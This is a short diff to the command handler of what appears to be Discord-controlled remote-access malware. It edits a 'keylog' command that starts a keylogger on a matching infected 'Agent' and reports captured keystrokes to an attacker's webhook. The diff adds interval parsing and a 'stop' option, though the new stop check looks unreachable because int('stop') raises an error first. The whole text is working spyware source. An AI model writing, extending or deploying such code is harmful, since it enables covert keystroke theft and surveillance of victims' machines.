@@ -268,8 +268,14 @@ async def keylog(context):
     if int(word_list[0]) == int(ID):
         def keylogger_start():
             try:
-                interval = word_list[1]
+                try:
+                    interval = int(word_list[1])
+                except:
+                    interval = word_list[1]
                 keyloggerr = keylogger.Keylogger(interval=int(interval), ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
+                if word_list[1] == "stop":
+                    keyloggerr.stop()
+                    return
                 keyloggerr.start()
             except IndexError:
                 my_embed = discord.Embed(title=f"Error while starting Keylogger on Agent#{ID}\nMake sure you have specified all the required parameters", color=0xFF0000)
